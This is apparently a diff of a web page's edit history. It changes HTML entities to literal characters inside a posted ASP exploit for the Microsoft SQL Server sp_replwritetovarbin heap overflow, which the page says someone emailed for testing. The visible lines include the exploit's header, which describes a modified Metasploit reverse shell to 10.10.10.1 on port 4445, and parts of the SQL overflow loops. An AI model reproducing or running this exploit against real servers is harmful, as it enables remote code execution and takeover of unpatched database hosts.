@@ -39,7 +39,7 @@ http://msdn.microsoft.com/en-us/library/aa215995(SQL.80).aspx
 Here is the code someone emailed me to test for the exploit 
 
 <pre>// k`sOSe 12/17/2008
-&lt;%// Microsoft SQL Server "sp_replwritetovarbin()" Heap Overflow
+<%// Microsoft SQL Server "sp_replwritetovarbin()" Heap Overflow
 // Tested on Win2k SP4 with MSSQL 2000(on one box only!).
 // Shellcode is a slightly modified metasploit reverse shell(on 10.10.10.1 port 4445),
 // the change allows multiple shots 🙂
@@ -68,7 +68,7 @@ SQL = "DECLARE @buf NVARCHAR(4000),				"&_
 "exec master.dbo.sp_replwritetovarbin 120, @end_offset output, @vb_buffer output, @vb_bufferlen output,''' "&_
 "SET @val = CHAR(0x41)						"&_
 "SET @counter = 0						"&_
-"WHILE @counter &lt; 3020						"&_
+"WHILE @counter < 3020						"&_
 "BEGIN								"&_
 "  SET @counter = @counter + 1					"&_
 "  IF @counter = 2900						"&_	 
@@ -108,7 +108,7 @@ SQL2 = "DECLARE @buf NVARCHAR(4000),				"&_
 "exec master.dbo.sp_replwritetovarbin 120, @end_offset output, @vb_buffer output, @vb_bufferlen output,''' "&_
 "SET @val = CHAR(0x41)						"&_
 "SET @counter = 0						"&_
-"WHILE @counter &lt; 3097						"&_
+"WHILE @counter < 3097						"&_
 "BEGIN								"&_
 "  SET @counter = @counter + 1					"&_
 "  IF @counter = 2900						"&_	 
@@ -148,7 +148,7 @@ SQL3 = "DECLARE @buf NVARCHAR(4000),				"&_
 "exec master.dbo.sp_replwritetovarbin 120, @end_offset output, @vb_buffer output, @vb_bufferlen output,''' "&_
 "SET @val = CHAR(0x41)						"&_
 "SET @counter = 0						"&_
-"WHILE @counter &lt; 3021						"&_
+"WHILE @counter < 3021						"&_
 "BEGIN								"&_
 "  SET @counter = @counter + 1					"&_
 "  IF @counter = 2900						"&_	 
@@ -188,7 +188,7 @@ SQL4 = "DECLARE @buf NVARCHAR(4000),				"&_
 "exec master.dbo.sp_replwritetovarbin 120, @end_offset output, @vb_buffer output, @vb_bufferlen output,''' "&_
 "SET @val = CHAR(0x41)						"&_
 "SET @counter = 0						"&_
-"WHILE @counter &lt; 2708						"&_
+"WHILE @counter < 2708						"&_
 "BEGIN								"&_
 "  SET @counter = @counter + 1					"&_
 "  IF @counter = 2900						"&_	 
@@ -311,4 +311,4 @@ Else
 end if
 
 
-%&gt;</pre>
+%></pre>
